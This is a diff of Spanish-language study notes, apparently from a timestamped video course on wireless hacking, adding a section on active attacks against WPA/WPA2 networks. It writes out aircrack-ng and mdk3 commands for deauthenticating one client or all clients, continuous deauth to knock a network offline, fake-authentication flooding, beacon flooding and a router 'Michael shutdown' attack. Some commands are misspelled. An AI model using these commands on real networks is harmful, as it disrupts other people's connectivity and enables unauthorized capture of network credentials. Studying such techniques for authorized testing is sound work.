@@ -199,8 +199,26 @@
   - para centrarnos en la red objetivo **airodump-ng --essid <nombre_ssid> wlan0mon** (00:42)
   - capturamos trafico **airodump-ng -w archivo_captura --essid <nombre_ssid> wlan0mon** (00:44) la idea es luego con tshark o wireshark cargar el archivo generado **tshark -r archivo_captura.cap**
 
-  - Ataque de-autenticacion dirigido (capturar handshake expulsando a un cliente de la red) Funciona solo para WPA/WPA2 con PSK (00:47-00:53)
-    - **airplay -ng -0 10 -e <nombre_essid> -c <mac_cliente> wlan0mon** (00:51)
+  ATAQUES ACTIVOS (forzar reconexion de cliente expone el handshake):
+  - Ataque de-autenticacion dirigido: capturar handshake expulsando a un cliente de la red. Funciona solo para WPA/WPA2 con PSK (00:47-00:53)
+    - **airplay -ng -0 10 -e <nombre_ssid> -c <mac_cliente> wlan0mon** (00:51)
 
-  - Ataque de-autenticacion global (expulsar a todos los clientes de la red, mas probable de obtener el handshake)(00:53)
-    - **airplay -ng -0 10 -e <nombre_essid> -c FF:FF:FF:FF:FF:FF wlan0mon**
+  - Ataque de-autenticacion global: expulsar a todos los clientes de la red, mas probable de obtener el handshake (00:53-00:59)
+    - **airplay -ng -0 10 -e <nombre_ssid> wlan0mon**
+    - si queremos dejar una wifi KO (infinitos paquetes de de-autenticacion) **airplay -ng -0 0 -e <nombre_ssid> wlan0mon**
+
+  - Ataque de autenticación: autentica a un cliente en una red (00:59-01:05)
+    - **airplay-ng -1 0 -e <nombre_ssid> -h <mac_falsa> wlan0mon**
+    - Ataque de autenticacion masiva mdk3 **mdk3 wlan0mon a -a <mac_router>** inyectara miles de clientes saturandola. Si hay un cliente real esto le obliga a reautenticarse y obtendremos el handshake (01:02)
+
+  - CTS Frame Attack: deja una red inoperativa para que los clientes sean deasociados y se autentiquen posteriormente (01:05-01:21)
+
+  - Beacon Flood Mode Attack: genera muchos puntos de accesos en el mismo canal (channel) que otro objetivo dejandola invisible para otros usuarios (01:21-01:27)
+    - **mkd3 wlan0mon b -c 1** en este ejemplo creamos cientos de redes de nombre aleatorio en el canal 1 
+
+  - Disassociation Amok Mode Attack (01:27-01:29)
+
+  - Michael Shutdown Exploitation: supuestamente apaga un router (01:29-01:XXX)
+    - **mdk3 wlan0mon m -t <mac_router>**
+
+  ATAQUES PASIVOS (esperamos a que el cliente se reasocie):
